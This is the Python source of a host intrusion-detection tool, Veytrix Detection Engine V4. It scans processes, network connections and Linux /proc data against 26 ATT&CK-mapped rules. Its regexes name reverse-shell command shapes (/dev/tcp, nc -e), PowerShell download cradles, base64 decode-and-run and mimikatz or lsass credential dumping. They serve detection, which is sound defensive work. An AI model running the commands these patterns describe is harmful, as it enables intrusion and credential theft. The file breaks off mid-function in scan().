#!/usr/bin/env python3
"""
veytrix_detect.py — Veytrix Detection Engine V4

Auto-scan + whitelist + persistence + fixes.

GUI:  double-click or `python veytrix_detect.py`
CLI:  `python veytrix_detect.py --no-gui scan --checks`
"""
from __future__ import annotations
import argparse
import datetime as dt
import hashlib
import html
import json
import os
import platform
import queue
import re
import socket
import sqlite3
import ssl
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    from cryptography import x509
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import tkinter as tk
    from tkinter import ttk, messagebox, filedialog, simpledialog
    HAS_TK = True
except ImportError:
    HAS_TK = False

VERSION = "4.0.0"
SEVERITIES = ("low", "medium", "high", "critical")
SEV_RANK = {s: i + 1 for i, s in enumerate(SEVERITIES)}
IS_WINDOWS = os.name == "nt"
IS_LINUX = sys.platform.startswith("linux")

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(SCRIPT_DIR, "veytrix_config.json")
DB_PATH = os.path.join(SCRIPT_DIR, "veytrix_findings.db")

# ═════════════════════════════════════════════════════════════════════════════
# Config
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_CONFIG = {
    "auto_scan_on_start": True,
    "auto_scan_interval_sec": 30,
    "min_confidence": 0.0,
    "check_tls_certs": False,
    "persist_findings": True,
    "max_persisted_findings": 500,
    "whitelist": {
        "process_names": [
            "python", "python3", "python3.10", "python3.11", "python3.12",
            "node", "java", "dotnet", "mono", "ruby", "perl",
            "code", "code-insiders", "electron",
            "gnome-shell", "Xorg", "Xwayland", "mutter", "kwin_x11",
            "kwin_wayland", "plasmashell", "kded5", "kglobalaccel5",
            "chrome", "chromium", "firefox", "msedge", "opera", "brave",
            "vivaldi",
        ],
        "paths_containing": [
            "/usr/", "/lib/", "/opt/", "/snap/", "/nix/store/",
            ".vscode/", ".local/lib/", "node_modules/",
            "site-packages/", "dist-packages/",
            "\\windows\\", "\\program files\\", "\\program files (x86)\\",
        ],
        "rule_ids_disabled": [],
        "fingerprints": [],
    },
}


def _merge_config(defaults, override):
    out = dict(defaults)
    for k, v in override.items():
        if isinstance(v, dict) and isinstance(out.get(k), dict):
            out[k] = _merge_config(out[k], v)
        else:
            out[k] = v
    return out


def load_config() -> dict:
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH) as f:
                user = json.load(f)
            return _merge_config(DEFAULT_CONFIG, user)
        except Exception:
            pass
    save_config(DEFAULT_CONFIG)
    return json.loads(json.dumps(DEFAULT_CONFIG))


def save_config(cfg: dict) -> None:
    try:
        with open(CONFIG_PATH, "w") as f:
            json.dump(cfg, f, indent=2)
    except Exception:
        pass


# ═════════════════════════════════════════════════════════════════════════════
# Data classes
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class ProcInfo:
    pid: int
    ppid: int
    name: str
    exe: str
    cmdline: str
    username: str
    create_time: float


@dataclass
class ConnInfo:
    pid: int
    process_name: str
    local_ip: str
    local_port: int
    remote_ip: str
    remote_port: int
    status: str


@dataclass
class Finding:
    rule_id: str
    name: str
    severity: str
    confidence: float
    evidence: list
    technique: str
    affected_pid: Optional[int] = None
    affected_process: str = ""
    remediation: str = ""
    timestamp: str = field(
        default_factory=lambda: dt.datetime.now(dt.timezone.utc).isoformat())
    fingerprint: str = ""
    affected_path: str = ""

    def __post_init__(self):
        if not self.fingerprint:
            key = f"{self.rule_id}|{self.affected_pid}|{self.affected_process}"
            self.fingerprint = hashlib.sha256(key.encode()).hexdigest()[:16]


@dataclass
class CheckStatus:
    name: str
    status: str
    reason: str = ""


# ═════════════════════════════════════════════════════════════════════════════
# Whitelist
# ═════════════════════════════════════════════════════════════════════════════

WHITELIST_RESPECTING_RULES = {"R-014", "R-016", "R-017", "R-019",
                               "R-021", "R-025"}


def is_whitelisted(proc_name, exe, rule_id, config) -> bool:
    if rule_id not in WHITELIST_RESPECTING_RULES:
        return False
    wl = config.get("whitelist", {})
    if rule_id in wl.get("rule_ids_disabled", []):
        return True
    name_l = (proc_name or "").lower()
    for w in wl.get("process_names", []):
        wl_l = w.lower()
        if wl_l in name_l or name_l == wl_l:
            return True
    exe_l = (exe or "").lower()
    for p in wl.get("paths_containing", []):
        if p.lower() in exe_l:
            return True
    return False


# ═════════════════════════════════════════════════════════════════════════════
# System context
# ═════════════════════════════════════════════════════════════════════════════

class SystemContext:
    def __init__(self):
        self.processes = []
        self.connections = []
        self.procs_by_pid = {}
        self.conns_by_pid = {}
        self.own_pid = os.getpid()
        self.scan_time = dt.datetime.now(dt.timezone.utc).isoformat()
        self.checks = []
        self.raw_proc_pids = set()
        self.kernel_modules = []
        self.platform = platform.system()
        self.is_admin = self._check_admin()

    @staticmethod
    def _check_admin() -> bool:
        try:
            if IS_WINDOWS:
                import ctypes
                return bool(ctypes.windll.shell32.IsUserAnAdmin())
            return os.geteuid() == 0
        except Exception:
            return False

    def record_check(self, name, status, reason=""):
        self.checks.append(CheckStatus(name, status, reason))

    @classmethod
    def capture(cls) -> "SystemContext":
        ctx = cls()
        if not HAS_PSUTIL:
            ctx.record_check("psutil", "failed", "not installed")
            return ctx
        try:
            for proc in psutil.process_iter(
                    ["pid", "ppid", "name", "exe", "cmdline",
                     "username", "create_time"]):
                try:
                    info = proc.info
                    p = ProcInfo(
                        pid=int(info["pid"]),
                        ppid=int(info["ppid"] or 0),
                        name=info.get("name") or "",
                        exe=info.get("exe") or "",
                        cmdline=" ".join(info.get("cmdline") or []),
                        username=info.get("username") or "",
                        create_time=float(info.get("create_time") or 0),
                    )
                    ctx.processes.append(p)
                    ctx.procs_by_pid[p.pid] = p
                except (psutil.NoSuchProcess, psutil.AccessDenied,
                        psutil.ZombieProcess):
                    continue
            ctx.record_check("process_iter", "ran")
        except Exception as exc:
            ctx.record_check("process_iter", "failed", str(exc))
        try:
            for c in psutil.net_connections(kind="inet"):
                if not c.raddr:
                    continue
                try:
                    pname = psutil.Process(c.pid).name() if c.pid else ""
                except Exception:
                    pname = ""
                conn = ConnInfo(
                    pid=c.pid or 0, process_name=pname,
                    local_ip=c.laddr.ip if c.laddr else "",
                    local_port=c.laddr.port if c.laddr else 0,
                    remote_ip=c.raddr.ip if c.raddr else "",
                    remote_port=c.raddr.port if c.raddr else 0,
                    status=c.status or "",
                )
                ctx.connections.append(conn)
                if conn.pid:
                    ctx.conns_by_pid.setdefault(conn.pid, []).append(conn)
            ctx.record_check("net_connections", "ran")
        except (psutil.AccessDenied, PermissionError):
            ctx.record_check("net_connections", "denied",
                             "run as admin/root")
        except Exception as exc:
            ctx.record_check("net_connections", "failed", str(exc))
        if IS_LINUX:
            try:
                ctx.raw_proc_pids = {
                    int(d) for d in os.listdir("/proc") if d.isdigit()
                }
                ctx.record_check("/proc enumeration", "ran")
            except Exception as exc:
                ctx.record_check("/proc enumeration", "failed", str(exc))
            try:
                with open("/proc/modules") as f:
                    ctx.kernel_modules = [
                        line.split()[0] for line in f if line.strip()
                    ]
                ctx.record_check("/proc/modules", "ran")
            except Exception as exc:
                ctx.record_check("/proc/modules", "denied", str(exc))
        return ctx


# ═════════════════════════════════════════════════════════════════════════════
# Constants
# ═════════════════════════════════════════════════════════════════════════════

EXPECTED_PARENTS = {
    "svchost.exe": ["services.exe"], "lsass.exe": ["wininit.exe"],
    "winlogon.exe": ["smss.exe"], "csrss.exe": ["smss.exe"],
    "services.exe": ["wininit.exe"],
    "smss.exe": ["system", "system idle process"],
    "taskhostw.exe": ["svchost.exe"], "lsm.exe": ["wininit.exe"],
}

SYSTEM_PROCESS_PATHS = {
    "svchost.exe": "\\windows\\system32\\",
    "lsass.exe": "\\windows\\system32\\",
    "csrss.exe": "\\windows\\system32\\",
    "winlogon.exe": "\\windows\\system32\\",
    "services.exe": "\\windows\\system32\\",
    "smss.exe": "\\windows\\system32\\",
    "wininit.exe": "\\windows\\system32\\",
}

OFFICE_PROCS = {"winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
                "msaccess.exe", "onenote.exe", "visio.exe"}
BROWSER_PROCS = {"chrome.exe", "msedge.exe", "firefox.exe", "brave.exe",
                 "opera.exe", "iexplore.exe", "vivaldi.exe"}
SHELL_PROCS = {"cmd.exe", "powershell.exe", "pwsh.exe", "bash", "sh",
               "zsh", "wscript.exe", "cscript.exe", "mshta.exe",
               "rundll32.exe", "regsvr32.exe", "python", "python3"}
WEB_SERVER_PROCS = {"nginx", "apache2", "httpd", "node", "php-fpm", "java",
                    "tomcat", "uwsgi", "gunicorn", "caddy", "lighttpd"}
JIT_PROCS = {"java", "node", "dotnet", "mono", "python", "python3",
             "chrome", "chromium", "firefox", "msedge", "opera", "brave",
             "vivaldi", "code", "code-insiders", "electron",
             "gnome-shell", "xorg", "xwayland", "mutter", "kwin",
             "plasmashell", "kded5", "kglobalaccel5"}

UPDATER_SAFE = {"chrome", "chromium", "firefox", "msedge", "opera",
                "brave", "vivaldi", "snapd", "apt", "dpkg", "systemd",
                "gnome-software", "update-manager", "plasma-discover",
                "packagekitd", "unattended-upgrades"}

SUSPICIOUS_DIRS_WIN = ("\\temp\\", "\\tmp\\", "\\appdata\\local\\temp\\",
                       "\\users\\public\\", "\\programdata\\",
                       "\\downloads\\", "\\recycle")
SUSPICIOUS_DIRS_LINUX = ("/tmp/", "/var/tmp/", "/dev/shm/", "/run/user/")
SUSPICIOUS_PORTS = {4444, 5555, 6666, 7777, 8888, 1337, 31337,
                    9001, 9030, 5900, 3389, 23, 12345, 54321}
TRUSTED_LINUX_PREFIXES = ("/usr/bin/", "/usr/sbin/", "/bin/", "/sbin/",
                          "/usr/lib/", "/lib/", "/lib64/", "/usr/lib64/",
                          "/usr/local/")

RE_ENCODED_PS = re.compile(
    r"-(e|en|enc|enco|encod|encode|encodedcommand)\s+[A-Za-z0-9+/=]{20,}",
    re.I)
RE_HIDDEN = re.compile(
    r"-(w|wi|win|wind|windo|window)\w*\s+hidden|"
    r"-nop\b|-noprofile\b|-executionpolicy\s+bypass|-ep\s+bypass", re.I)
RE_DOWNLOAD = re.compile(
    r"downloadstring|downloadfile|invoke-webrequest|invoke-restmethod|"
    r"net\.webclient|start-bitstransfer|\bwget\s+https?:|"
    r"\bcurl\s+-[a-zA-Z]*[oOsS]?\s*https?:|"
    r"http[s]?://[^\s]+\.(exe|ps1|bat|vbs|dll|scr)", re.I)
RE_BASE64_PIPE = re.compile(
    r"base64\s+(-d|--decode)|\bcertutil\b.*-decode|frombase64string|"
    r"echo\s+[A-Za-z0-9+/=]{20,}\s*\|", re.I)
RE_REVERSE_SHELL = re.compile(
    r"bash\s+-i\s+>&|/dev/tcp/|mkfifo.*nc|"
    r"python[23]?\s+-c\s+.{0,30}socket|perl\s+-e\s+.{0,30}socket|"
    r"nc\s+.*\s+-e\s+|ncat\s+.*\s+-e\s+|netcat\s+.*\s+-e\s+", re.I)
RE_MIMIKATZ = re.compile(
    r"mimikatz|sekurlsa|kerberos::|lsadump|invoke-mimikatz|"
    r"procdump.*lsass|comsvcs.*lsass|"
    r"sekurlsa::logonpasswords|sekurlsa::wdigest", re.I)
RE_LSASS_DUMP = re.compile(
    r"\blsass\b.*\b(dump|procdump|mini)|procdump.*\blsass\b|"
    r"rundll32.*comsvcs.*mini", re.I)


# ═════════════════════════════════════════════════════════════════════════════
# Helpers
# ═════════════════════════════════════════════════════════════════════════════

def check_binary_signature(path):
    if not path or not os.path.exists(path):
        return "unknown"
    try:
        if IS_WINDOWS:
            pl = path.lower()
            if ("\\windows\\system32\\" in pl or "\\windows\\syswow64\\" in pl
                    or "\\program files\\" in pl
                    or "\\program files (x86)\\" in pl):
                return "trusted"
            return "unknown"  # Windows: don't flag unknown
        if IS_LINUX:
            return ("trusted"
                    if any(path.startswith(p) for p in TRUSTED_LINUX_PREFIXES)
                    else "untrusted")
    except Exception:
        pass
    return "unknown"


def check_rwx_memory(pid):
    if not IS_LINUX:
        return []
    try:
        with open(f"/proc/{pid}/maps") as f:
            return [ln.strip() for ln in f
                    if len(ln.split()) >= 2 and "rwx" in ln.split()[1]]
    except (FileNotFoundError, PermissionError, ProcessLookupError):
        return []


def check_anonymous_exec_memory(pid):
    if not IS_LINUX:
        return []
    try:
        hits = []
        with open(f"/proc/{pid}/maps") as f:
            for line in f:
                parts = line.split()
                if len(parts) < 2:
                    continue
                perms = parts[1]
                path = " ".join(parts[5:]) if len(parts) > 5 else ""
                if "x" in perms and not path.strip():
                    hits.append(line.strip())
                elif "x" in perms and any(
                        m in path for m in ("[heap]", "[stack]", "memfd:")):
                    hits.append(line.strip())
        return hits
    except (FileNotFoundError, PermissionError, ProcessLookupError):
        return []


def check_tls_cert(ip, port, timeout=2.0):
    if not HAS_CRYPTO:
        return None
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((ip, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=ip) as tls:
                der = tls.getpeercert(binary_form=True)
                if not der:
                    return None
        cert = x509.load_der_x509_certificate(der)
        return {
            "self_signed": cert.issuer == cert.subject,
            "expired": cert.not_valid_after_utc
                       < dt.datetime.now(dt.timezone.utc),
            "issuer": _name_str(cert.issuer),
        }
    except Exception:
        return None


def _name_str(name):
    try:
        return ", ".join(f"{a.oid._name}={a.value}" for a in name)
    except Exception:
        return str(name)


def get_kernel_module_path(module):
    if not IS_LINUX:
        return ""
    try:
        r = subprocess.run(["modinfo", "-F", "filename", module],
                           capture_output=True, text=True, timeout=2)
        return r.stdout.strip()
    except Exception:
        return ""


def is_jit_process(name):
    n = (name or "").lower()
    return any(j in n for j in JIT_PROCS)


# ═════════════════════════════════════════════════════════════════════════════
# Detection rules (26, each takes ctx + config)
# ═════════════════════════════════════════════════════════════════════════════

def rule_encoded_powershell(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        n = p.name.lower()
        if "powershell" not in n and "pwsh" not in n:
            continue
        if RE_ENCODED_PS.search(p.cmdline):
            out.append(Finding(
                "R-001", "Encoded PowerShell Command", "high", 0.85,
                [f"PID {p.pid} ({p.name})", f"Command: {p.cmdline[:300]}"],
                "T1059.001", p.pid, p.name,
                "Decode Base64 payload."))
    return out


def rule_hidden_execution(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if not any(s in p.name.lower()
                   for s in ("powershell", "pwsh", "cmd",
                             "wscript", "cscript")):
            continue
        if RE_HIDDEN.search(p.cmdline):
            out.append(Finding(
                "R-002", "Hidden Window / Bypass", "medium", 0.7,
                [f"PID {p.pid} ({p.name})", f"Command: {p.cmdline[:300]}"],
                "T1564.003", p.pid, p.name,
                "Review parent and network."))
    return out


def rule_download_cradle(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_DOWNLOAD.search(p.cmdline):
            out.append(Finding(
                "R-003", "Download Cradle", "high", 0.75,
                [f"PID {p.pid} ({p.name})", f"Command: {p.cmdline[:300]}"],
                "T1105", p.pid, p.name,
                "Block URL at egress."))
    return out


def rule_office_spawns_shell(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or p.name.lower() not in SHELL_PROCS:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if parent and parent.name.lower() in OFFICE_PROCS:
            out.append(Finding(
                "R-004", "Office Spawned Shell", "critical", 0.9,
                [f"Parent: {parent.name} (PID {parent.pid})",
                 f"Child: {p.name} (PID {p.pid})",
                 f"Command: {p.cmdline[:300]}"],
                "T1566.001", p.pid, p.name,
                "Isolate host, inspect source doc."))
    return out


def rule_browser_spawns_shell(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or p.name.lower() not in SHELL_PROCS:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if parent and parent.name.lower() in BROWSER_PROCS:
            out.append(Finding(
                "R-005", "Browser Spawned Shell", "high", 0.8,
                [f"Parent: {parent.name}", f"Child: {p.name}"],
                "T1189", p.pid, p.name,
                "Possible drive-by."))
    return out


def rule_suspicious_location(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or not p.exe:
            continue
        el = p.exe.lower()
        if (any(d in el for d in SUSPICIOUS_DIRS_WIN)
                or any(el.startswith(d) for d in SUSPICIOUS_DIRS_LINUX)):
            out.append(Finding(
                "R-006", "Executable in Suspicious Location", "high", 0.75,
                [f"PID {p.pid} ({p.name})", f"Path: {p.exe}"],
                "T1036", p.pid, p.name,
                "Verify hash on VirusTotal."))
    return out


def rule_credential_access(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_MIMIKATZ.search(p.cmdline) or "mimikatz" in p.name.lower():
            out.append(Finding(
                "R-007", "Credential Access Tool", "critical", 0.95,
                [f"PID {p.pid} ({p.name})", f"Command: {p.cmdline[:300]}"],
                "T1003.001", p.pid, p.name,
                "IMMEDIATE: rotate ALL credentials."))
    return out


def rule_lsass_access(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_LSASS_DUMP.search(p.cmdline):
            out.append(Finding(
                "R-008", "LSASS Dump Pattern", "critical", 0.9,
                [f"PID {p.pid} ({p.name})", f"Command: {p.cmdline[:300]}"],
                "T1003.001", p.pid, p.name,
                "IMMEDIATE: rotate credentials."))
    return out


def rule_reverse_shell(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_REVERSE_SHELL.search(p.cmdline):
            out.append(Finding(
                "R-009", "Reverse Shell Pattern", "critical", 0.9,
                [f"PID {p.pid} ({p.name})", f"Command: {p.cmdline[:300]}"],
                "T1059", p.pid, p.name,
                "Kill, block IP, investigate."))
    return out


def rule_base64_pipe(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_BASE64_PIPE.search(p.cmdline):
            out.append(Finding(
                "R-010", "Base64 Decode-and-Execute", "high", 0.8,
                [f"PID {p.pid} ({p.name})", f"Command: {p.cmdline[:300]}"],
                "T1027", p.pid, p.name,
                "Decode payload manually."))
    return out


def rule_suspicious_port(ctx, cfg):
    out = []
    for c in ctx.connections:
        if c.remote_port in SUSPICIOUS_PORTS:
            out.append(Finding(
                "R-011", f"Suspicious Port {c.remote_port}", "high", 0.7,
                [f"Process: {c.process_name} (PID {c.pid})",
                 f"{c.local_ip}:{c.local_port} → "
                 f"{c.remote_ip}:{c.remote_port}"],
                "T1571", c.pid, c.process_name,
                f"Block port {c.remote_port}."))
    return out


def rule_beaconing(ctx, cfg):
    out = []
    for pid, conns in ctx.conns_by_pid.items():
        if pid == ctx.own_pid or len(conns) < 3:
            continue
        counts = {}
        for c in conns:
            counts[c.remote_ip] = counts.get(c.remote_ip, 0) + 1
        for ip, count in counts.items():
            if count >= 3:
                out.append(Finding(
                    "R-012", f"Beaconing to {ip}", "medium", 0.6,
                    [f"Process: {conns[0].process_name} (PID {pid})",
                     f"{count} connections to {ip}"],
                    "T1071", pid, conns[0].process_name,
                    "Possible C2 beaconing."))
    return out


def rule_masquerading_name(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or not p.exe:
            continue
        name = p.name.lower()
        if name in SYSTEM_PROCESS_PATHS:
            expected = SYSTEM_PROCESS_PATHS[name]
            if expected not in p.exe.lower().replace("/", "\\"):
                out.append(Finding(
                    "R-013", f"Masquerading ({name})", "critical", 0.85,
                    [f"PID {p.pid} ({p.name})", f"Path: {p.exe}",
                     f"Expected: {expected}"],
                    "T1036.005", p.pid, p.name,
                    "Wrong path — investigate."))
    return out


def rule_unsigned_binary(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or not p.exe:
            continue
        if any(d in p.exe.lower() for d in SUSPICIOUS_DIRS_WIN):
            continue
        if is_whitelisted(p.name, p.exe, "R-014", cfg):
            continue
        if check_binary_signature(p.exe) != "untrusted":
            continue
        # On Linux: only flag if ALSO has suspicious indicators
        suspicious = False
        if p.pid in ctx.conns_by_pid and len(ctx.conns_by_pid[p.pid]) > 0:
            parent = ctx.procs_by_pid.get(p.ppid)
            if parent is None or parent.name.lower() in (
                    OFFICE_PROCS | BROWSER_PROCS):
                suspicious = True
        if not suspicious:
            continue
        out.append(Finding(
            "R-014", "Unsigned Binary with Network",
            "medium", 0.65,
            [f"PID {p.pid} ({p.name})", f"Path: {p.exe}",
             "Untrusted path + active network"],
            "T1553.002", p.pid, p.name,
            "Verify hash and origin.",
            affected_path=p.exe))
    return out


def rule_wrong_parent_chain(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        name = p.name.lower()
        if name not in EXPECTED_PARENTS:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if not parent:
            continue
        expected = [x.lower() for x in EXPECTED_PARENTS[name]]
        if parent.name.lower() not in expected:
            out.append(Finding(
                "R-015", f"Wrong Parent for {p.name}", "high", 0.8,
                [f"PID {p.pid} ({p.name})",
                 f"Expected: {', '.join(expected)}",
                 f"Actual: {parent.name}",
                 "Classic masquerading"],
                "T1036.005", p.pid, p.name,
                "Investigate immediately."))
    return out


def rule_rwx_memory(ctx, cfg):
    if not IS_LINUX:
        ctx.record_check("rwx_memory", "skipped", "Linux only")
        return []
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if is_jit_process(p.name):
            continue
        if is_whitelisted(p.name, p.exe, "R-016", cfg):
            continue
        hits = check_rwx_memory(p.pid)
        if hits:
            out.append(Finding(
                "R-016", "RWX Memory", "high", 0.6,
                [f"PID {p.pid} ({p.name})", f"RWX: {hits[0][:150]}"],
                "T1055", p.pid, p.name,
                "Possible injection."))
    return out


def rule_anonymous_exec_memory(ctx, cfg):
    if not IS_LINUX:
        ctx.record_check("anon_exec", "skipped", "Linux only")
        return []
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if is_jit_process(p.name):
            continue
        if is_whitelisted(p.name, p.exe, "R-017", cfg):
            continue
        hits = check_anonymous_exec_memory(p.pid)
        if hits:
            out.append(Finding(
                "R-017", "Anonymous Executable Memory", "high", 0.7,
                [f"PID {p.pid} ({p.name})", f"Map: {hits[0][:150]}"],
                "T1055", p.pid, p.name,
                "Likely fileless attack."))
    return out


def rule_orphaned_with_network(ctx, cfg):
    out = []
    for pid, conns in ctx.conns_by_pid.items():
        if pid == ctx.own_pid:
            continue
        p = ctx.procs_by_pid.get(pid)
        if not p or not conns:
            continue
        if p.ppid and p.ppid not in ctx.procs_by_pid and p.ppid != 1:
            out.append(Finding(
                "R-018", "Orphaned Process with Network", "medium", 0.6,
                [f"PID {pid} ({p.name})", f"Parent {p.ppid} dead",
                 f"Conns: {len(conns)}"],
                "T1564", pid, p.name,
                "Check parent death."))
    return out


def rule_hidden_process(ctx, cfg):
    if not IS_LINUX or not ctx.raw_proc_pids:
        return []
    out = []
    hidden = ctx.raw_proc_pids - set(ctx.procs_by_pid.keys())
    for pid in hidden:
        # Skip kernel threads (empty /proc/pid/cmdline)
        try:
            with open(f"/proc/{pid}/cmdline", "rb") as f:
                cmdline = f.read()
            if not cmdline:
                continue
        except Exception:
            continue
        try:
            with open(f"/proc/{pid}/comm") as f:
                comm = f.read().strip()
            if is_whitelisted(comm, "", "R-019", cfg):
                continue
            out.append(Finding(
                "R-019", "Hidden Process (Rootkit)", "high", 0.8,
                [f"PID {pid} in /proc not psutil", f"comm: {comm}"],
                "T1014", pid, comm,
                "Rootkit indicator."))
        except Exception:
            continue
    return out


def rule_suspicious_kernel_module(ctx, cfg):
    if not IS_LINUX or not ctx.kernel_modules:
        return []
    out = []
    for module in ctx.kernel_modules:
        path = get_kernel_module_path(module)
        if not path:
            continue
        if any(path.startswith(p) for p in
               ("/tmp/", "/var/tmp/", "/dev/shm/", "/home/")):
            out.append(Finding(
                "R-020", "Kernel Module from Suspicious Path",
                "critical", 0.9,
                [f"Module: {module}", f"Path: {path}"],
                "T1014", None, module,
                "IMMEDIATE: possible rootkit."))
    return out


def rule_self_signed_tls(ctx, cfg):
    if not cfg.get("check_tls_certs", False):
        ctx.record_check("tls_cert", "skipped", "disabled in config")
        return []
    if not HAS_CRYPTO:
        ctx.record_check("tls_cert", "skipped", "cryptography missing")
        return []
    out = []
    checked = set()
    for c in ctx.connections:
        if c.remote_port not in (443, 8443) or not c.remote_ip:
            continue
        if c.remote_ip.startswith(("10.", "172.", "192.168.", "127.",
                                   "169.254.", "0.0.0.0")):
            continue
        if is_whitelisted(c.process_name, "", "R-021", cfg):
            continue
        key = (c.remote_ip, c.remote_port)
        if key in checked:
            continue
        checked.add(key)
        info = check_tls_cert(c.remote_ip, c.remote_port)
        if not info:
            continue
        if info["self_signed"]:
            out.append(Finding(
                "R-021", "Self-Signed TLS", "high", 0.7,
                [f"Process: {c.process_name} (PID {c.pid})",
                 f"Dest: {c.remote_ip}:{c.remote_port}",
                 f"Issuer: {info['issuer']}"],
                "T1573.002", c.pid, c.process_name,
                "Possible C2 over HTTPS."))
        elif info["expired"]:
            out.append(Finding(
                "R-021", "Expired TLS", "medium", 0.55,
                [f"Process: {c.process_name}",
                 f"Dest: {c.remote_ip}:{c.remote_port}"],
                "T1573.002", c.pid, c.process_name,
                "May indicate C2."))
    ctx.record_check("tls_cert", "ran")
    return out


def rule_web_server_spawns_shell(ctx, cfg):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or p.name.lower() not in SHELL_PROCS:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if parent and parent.name.lower() in WEB_SERVER_PROCS:
            out.append(Finding(
                "R-022", "Web Server Spawned Shell", "critical", 0.9,
                [f"Parent: {parent.name} (PID {parent.pid})",
                 f"Child: {p.name} (PID {p.pid})",
                 f"Command: {p.cmdline[:300]}"],
                "T1505.003", p.pid, p.name,
                "Possible web shell / RCE."))
    return out


def rule_cross_platform_spawn(ctx, cfg):
    out = []
    linux_shells = {"bash", "sh", "zsh", "fish"}
    win_shells = {"powershell.exe", "cmd.exe", "pwsh.exe"}
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if not parent:
            continue
        pn, cn = parent.name.lower(), p.name.lower()
        if (pn in linux_shells and cn in win_shells) or \
           (pn in win_shells and cn in linux_shells and IS_WINDOWS):
            out.append(Finding(
                "R-023", "Cross-Platform Shell Spawn", "medium", 0.7,
                [f"Parent: {parent.name}", f"Child: {p.name}"],
                "T1059", p.pid, p.name,
                "Unusual spawn."))
    return out


def rule_browser_jit_child(ctx, cfg):
    out = []
    susp = {"curl", "wget", "nc", "ncat", "netcat",
            "powershell.exe", "cmd.exe", "bash", "sh"}
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if not parent:
            continue
        if (parent.name.lower() in BROWSER_PROCS
                and p.name.lower() in susp):
            out.append(Finding(
                "R-024", "Browser Spawned Suspicious Child",
                "high", 0.75,
                [f"Parent: {parent.name}", f"Child: {p.name}",
                 f"Command: {p.cmdline[:200]}"],
                "T1189", p.pid, p.name,
                "Drive-by or malicious extension."))
    return out


def rule_memfd_deleted_binary(ctx, cfg):
    if not IS_LINUX:
        return []
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        n = p.name.lower()
        if any(u in n for u in UPDATER_SAFE):
            continue
        if is_whitelisted(p.name, p.exe, "R-025", cfg):
            continue
        try:
            link = os.readlink(f"/proc/{p.pid}/exe")
            if " (deleted)" in link or link.startswith("/memfd:"):
                out.append(Finding(
                    "R-025", "Running Deleted Binary", "high", 0.75,
                    [f"PID {p.pid} ({p.name})", f"Exe: {link}"],
                    "T1070.004", p.pid, p.name,
                    "Preserve memory, do not reboot."))
        except (FileNotFoundError, PermissionError, ProcessLookupError):
            continue
    return out


def rule_ld_preload_injection(ctx, cfg):
    if not IS_LINUX:
        return []
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        try:
            with open(f"/proc/{p.pid}/environ", "rb") as f:
                env = f.read().split(b"\x00")
            for var in env:
                try:
                    d = var.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                if d.startswith("LD_PRELOAD="):
                    path = d.split("=", 1)[1]
                    if any(path.startswith(p2) for p2 in
                           ("/tmp/", "/var/tmp/", "/dev/shm/", "/home/")):
                        out.append(Finding(
                            "R-026", "Suspicious LD_PRELOAD", "high", 0.85,
                            [f"PID {p.pid} ({p.name})",
                             f"LD_PRELOAD={path}"],
                            "T1574.006", p.pid, p.name,
                            "Userland hooking."))
        except (FileNotFoundError, PermissionError, ProcessLookupError):
            continue
    return out


ALL_RULES = [
    rule_encoded_powershell, rule_hidden_execution, rule_download_cradle,
    rule_office_spawns_shell, rule_browser_spawns_shell,
    rule_suspicious_location, rule_credential_access, rule_lsass_access,
    rule_reverse_shell, rule_base64_pipe, rule_suspicious_port,
    rule_beaconing, rule_masquerading_name, rule_unsigned_binary,
    rule_wrong_parent_chain, rule_rwx_memory, rule_anonymous_exec_memory,
    rule_orphaned_with_network, rule_hidden_process,
    rule_suspicious_kernel_module, rule_self_signed_tls,
    rule_web_server_spawns_shell, rule_cross_platform_spawn,
    rule_browser_jit_child, rule_memfd_deleted_binary,
    rule_ld_preload_injection,
]


def scan(ctx=None, cfg=None):
    if ctx is None:
        ctx = SystemContext.capture()
    if cfg is None:
        cfg = load_config()
    findings = []
    for rule in ALL_RULES:
        try:
            findings.extend(rule(ctx, cfg))
